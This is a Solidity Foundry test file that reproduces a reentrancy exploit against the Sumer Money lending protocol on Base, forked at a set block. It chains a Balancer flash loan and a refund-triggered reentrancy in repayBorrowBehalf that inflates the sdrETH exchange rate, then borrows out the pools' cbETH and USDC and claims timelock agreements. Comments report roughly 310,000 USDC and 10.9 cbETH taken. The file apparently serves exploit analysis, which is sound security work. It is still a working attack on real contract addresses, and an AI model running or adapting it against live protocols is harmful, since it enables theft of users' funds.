// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "./interface/IBalancer.sol";
import "./interface/IWETH9.sol";
import "./interface/IERC20.sol";
import "./interface/ISumerMoney.sol";

WETH9 constant WETH = WETH9(0x4200000000000000000000000000000000000006);
IERC20 constant circleUSDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);

ICEther constant sdrETH = ICEther(
    payable(0x7b5969bB51fa3B002579D7ee41A454AC691716DC)
);

ICErc20 constant sdrUSDC = ICErc20(0x142017b52c99d3dFe55E49d79Df0bAF7F4478c0c);
ICErc20 constant sdrcbETH = ICErc20(0x6345aF6dA3EBd9DF468e37B473128Fd3079C4a4b);

IBalancerVault constant vault = IBalancerVault(
    0xBA12222222228d8Ba445958a75a0704d566BF2C8
);

ITimelock constant timelock = ITimelock(
    payable(0x549D0CdC753601fbE29f9DE186868429a8558E07)
);

ICbETH constant cbETH = ICbETH(0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22);

address constant sumer = 0x611375907733D9576907E125Fb29704712F0BAfA;

/*  
Before re-enter, sdrETH exchangeRate: 1.000000141462697393
In re-enter, sdrETH exchangeRate: 2.000000282255689758
USDC Balance After exploit: 310570.845597
cbETH Balance After exploit: 10.877097943908610977
*/

contract SumerMoneyHelper {
    address admin;

    constructor() payable {
        admin = msg.sender;
    }

    function anony1() public {
        uint256 balanceUSDC = circleUSDC.balanceOf(address(this));

        circleUSDC.approve(address(sdrUSDC), balanceUSDC);
        sdrUSDC.mint(balanceUSDC);

        sdrETH.borrow(150358797170664290045);
        // Reentrancy
        sdrETH.repayBorrowBehalf{value: 150358797170664290046}(address(this));

        sdrUSDC.redeem(sdrUSDC.balanceOf(address(this)));

        uint256[] memory agreementIds = new uint256[](1);
        agreementIds[0] = 311;
        timelock.claim(agreementIds);

        balanceUSDC = circleUSDC.balanceOf(address(this));
        circleUSDC.transfer(admin, balanceUSDC);
    }

    receive() external payable {
        if (msg.value == 1) {
            admin.call(abi.encodeWithSignature("attack()"));
        }
    }
}

contract SumerMoneyHack is Test {
    SumerMoneyHelper helper;

    constructor() payable {
        // 创建一个辅助合约
        helper = new SumerMoneyHelper{value: msg.value}();
    }

    function exploit() public {
        address[] memory tokens = new address[](2);
        tokens[0] = address(WETH);
        tokens[1] = address(circleUSDC);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 150 ether;
        amounts[1] = 645000000000;

        vault.flashLoan(address(this), tokens, amounts, hex"3030");

        emit log_named_decimal_uint(
            "USDC Balance After exploit",
            circleUSDC.balanceOf(address(this)),
            circleUSDC.decimals()
        );
        emit log_named_decimal_uint(
            "cbETH Balance After exploit",
            cbETH.balanceOf(address(this)),
            cbETH.decimals()
        );
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        tokens;
        feeAmounts;
        userData;

        WETH.withdraw(amounts[0]);

        // sdrETH.exchangeRate
        emit log_named_decimal_uint(
            "Before re-enter, sdrETH exchangeRate",
            sdrETH.exchangeRateCurrent(),
            18
        );

        sdrETH.mint{value: amounts[0]}();

        // 转入circleUSDC
        circleUSDC.transfer(
            address(helper),
            circleUSDC.balanceOf(address(this))
        );

        helper.anony1();

        WETH.deposit{value: 150 ether}();
        WETH.transfer(address(vault), 150 ether);
        circleUSDC.transfer(address(vault), 645000000000);
    }

    function attack() external {
        // exchangeRate == getCashPrior() + totalBorrows - totalReserves / totalSupply
        // In function repayBorrowBehalf(), getCashPrior() increase 150 ether but totalBorrows not decreased due to re-enter
        emit log_named_decimal_uint(
            "In re-enter, sdrETH exchangeRate",
            sdrETH.exchangeRateCurrent(),
            18
        );

        sdrcbETH.borrow(cbETH.balanceOf(address(sdrcbETH)));
        sdrUSDC.borrow(circleUSDC.balanceOf(address(sdrUSDC)) - 645000000000);
        sdrETH.redeemUnderlying(150 ether);

        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 309;
        tokenIds[1] = 310;
        timelock.claim(tokenIds);
    }

    receive() external payable {}
}

contract SumerMoneyTest is Test {
    SumerMoneyHack hacker;

    function setUp() public {
        vm.createSelectFork("base", 13_076_768);
    }

    function testExploit() public {
        hacker = new SumerMoneyHack{value: 1}();
        hacker.exploit();
    }
}
